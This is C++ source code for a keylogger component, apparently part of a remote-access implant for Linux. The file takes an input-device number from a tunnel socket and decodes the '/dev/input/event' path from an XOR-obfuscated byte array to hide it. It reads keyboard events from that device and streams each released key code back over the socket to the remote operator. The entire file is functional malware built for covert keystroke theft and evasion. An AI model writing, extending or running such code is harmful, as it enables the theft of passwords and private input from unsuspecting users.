#include "clkeylogger.hpp"
#include "debug.hpp"

void CLKeylogger::run() {
    // Receive the event number
    uint32_t event_num;
    int rc = recv(tunnel_socket_, &event_num, sizeof(event_num), 0);
    if (rc <= 0) {
        DEBUG_PRINT("[CLKeylogger] Error receiving file name: %s\n", strerror(errno));
        return;
    }
    unsigned char obf[] = {0x80, 0xcb, 0xca, 0xd9, 0x80, 0xc6, 0xc1, 0xdf, 0xda, 0xdb, 0x80, 0xca, 0xd9, 0xca, 0xc1, 0xdb};
    char input_path[PATH_MAX];

    int num_size = (event_num == 0 || event_num == 1) ? 2 : (int) (ceil(log(event_num) + 1));
    char str_event_num[num_size];        

    snprintf(str_event_num, num_size, "%u", event_num);

    for (int i = 0;i<sizeof(obf);i++) {
        input_path[i] = obf[i] ^ OBF_KEY;
    }

    strncpy(input_path + sizeof(obf),str_event_num,num_size);

    DEBUG_PRINT("File name is: %s\n", input_path);

    int dev_fd = open(input_path, O_RDONLY);
    if (dev_fd < 0) {
        send_out(tunnel_socket_, EXEC_ERROR);
        return;
    }

    struct input_event ev;

    // Receive the logs
    while (!tunnel_shutdown_flag_) {
        int bytes = read(dev_fd, &ev, sizeof(ev));
        if (bytes < 0) {
            send_out(tunnel_socket_, EXEC_ERROR);
            return;
        }
        if (ev.type == EV_KEY && ev.value == 0) {
            send(tunnel_socket_, &ev.code, sizeof(ev.code), 0);
        } 
    }

}